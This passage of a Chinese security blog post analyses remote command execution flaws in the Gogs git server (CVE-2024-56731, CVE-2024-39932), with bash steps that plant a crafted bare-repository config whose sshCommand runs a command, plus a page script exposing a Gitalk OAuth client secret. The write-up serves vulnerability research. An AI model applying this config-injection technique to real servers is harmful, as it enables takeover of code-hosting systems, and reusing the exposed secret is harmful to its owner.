<p>那我们即可通过删除 <code>.git</code> 目录下的某个文件，使得<code>.git</code>文件夹被找到但不被认为有效，进而跳到上一级目录去判断，仓库内文件我们可控，我们可以将仓库伪装成一个裸仓库，通过<code>git</code>的 <code>config</code>文件配置来实现RCE的目的，这也对应上了开发者所打的补丁（见上文 <code>DeleteRepoFile</code>）。</p>
<p>config 文件可控如何RCE？例如在 .git的<a target="_blank" rel="noopener" href="https://git-scm.com/docs/git-config">config.core</a>存在这样的一个配置项：<code>sshCommand</code> ，这个配置项允许我们自定义ssh命令，从而实现RCE的目的。还存在一些如 <code>gitProxy</code>&#x2F;<code>fsmonitor</code>等，不再赘述。</p>
<p>思路有了，接着来调试，发出删除文件请求，TreePath 路径显示如下：<br><img src="/2025/06/30/WEB/2025%20Gogs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(CVE-2024-56731)/before-TreePath.png" srcset="/img/loading.gif" lazyload alt="TreePath"></p>
<p>再进入到 <code>DeleteRepoFile</code> 这个函数：<br><img src="/2025/06/30/WEB/2025%20Gogs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(CVE-2024-56731)/DeleteRepoFile-treepath.png" srcset="/img/loading.gif" lazyload alt="文件删除路径"></p>
<p>可以看出服务端操作的是 <code>~/.cache/JetBrains/GoLand2025.2/tmp/GoLand/data/tmp/local-repo/6</code> 这个仓库<br>再来制作一个伪装的裸仓库：</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone http://localhost:3000/baby/test2.git    
<span class="token function">vim</span> .git/config
<span class="token punctuation">[</span>core<span class="token punctuation">]</span>
	worktree <span class="token operator">=</span> ./
	sshCommand <span class="token operator">=</span> <span class="token builtin class-name">echo</span> <span class="token string">'k3ppf0r'</span> <span class="token operator">></span> /tmp/k3ppf0r
<span class="token comment"># 仓库操作</span>
<span class="token function">git</span> <span class="token function">add</span> <span class="token builtin class-name">.</span>
<span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token string">"1"</span>
<span class="token function">git</span> remote <span class="token function">add</span> origin http://localhost:3000/xiaok/test2.git 
<span class="token function">cp</span> <span class="token parameter variable">-r</span> .git/* ./
<span class="token function">git</span> push <span class="token parameter variable">-u</span> origin master

<span class="token comment"># 判断是否为裸仓库</span>
<span class="token function">git</span> rev-parse --is-bare-repository<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>

<p>此时又遇到一个问题，在删除文件的时会触发</p>
<h2 id="CVE-2024-39932"><a href="#CVE-2024-39932" class="headerlink" title="CVE-2024-39932"></a>CVE-2024-39932</h2><p>这个漏洞显得直接的多，在命令执行的时候存在参数拼接的问题，导致命令执行：</p>
<p><img src="/2025/06/30/WEB/2025%20Gogs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(CVE-2024-56731)/CVE-2024-39932/GetDiffPreview-rce.png" srcset="/img/loading.gif" lazyload alt="GetDiffPreview"></p>
<h1 id="CVE-2024-56731"><a href="#CVE-2024-56731" class="headerlink" title="CVE-2024-56731"></a>CVE-2024-56731</h1><p>好好好，回到最初的目的上来，似乎已经跑题许久，但在这个过程我们还是收获到了许多基于 git 开发的平台潜在的安全问题。让我们来看符号链接这个漏洞吧！</p>
<p>PS： 对于集成如<code>git</code>等知名第三方二进制程序软件库，我们需重点留心RCE类漏洞</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/163575">https://www.anquanke.com/post/id/163575</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/10749">https://xz.aliyun.com/news/10749</a></li>
<li><a target="_blank" rel="noopener" href="https://avd.aliyun.com/detail?id=AVD-2024-56731">https://avd.aliyun.com/detail?id=AVD-2024-56731</a></li>
<li><a target="_blank" rel="noopener" href="https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1/">https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-2/">https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-2/</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/gogs/gogs/security/advisories/GHSA-r7j8-5h9c-f6fx">https://github.com/gogs/gogs/security/advisories/GHSA-r7j8-5h9c-f6fx</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/gogs/gogs/security/advisories/GHSA-qf5v-rp47-55gg">https://github.com/gogs/gogs/security/advisories/GHSA-qf5v-rp47-55gg</a></li>
</ul>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/WEB/" class="category-chain-item">WEB</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/git/" class="print-no-link">#git</a>
      
        <a href="/tags/go/" class="print-no-link">#go</a>
      
        <a href="/tags/RCE/" class="print-no-link">#RCE</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>2025 Gogs 远程命令执行(CVE-2024-56731)</div>
      <div>https://k3ppf0r.github.io/2025/06/30/WEB/2025 Gogs 远程命令执行(CVE-2024-56731)/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>k3ppf0r</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年6月30日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="gitalk-container"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#gitalk-container', function() {
      Fluid.utils.createCssLink('/css/gitalk.css')
      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
        var options = Object.assign(
          {"clientID":"Ov23liMVKVOtuwYuvkw8","clientSecret":"9cb05e91f4572848c2255807ec06c72dcf447340","repo":"blog-gitalk-comments","owner":"k3ppf0r","admin":["k3ppf0r"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
          {
            id: '2a51be4d0cd6da00a37ed46b6270740a'
          }
        )
        var gitalk = new Gitalk(options);
        gitalk.render('gitalk-container');
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    

  

</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script  src="https://lib.baomitu.com/prism/1.28.0/plugins/line-numbers/prism-line-numbers.min.js" ></script>

  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
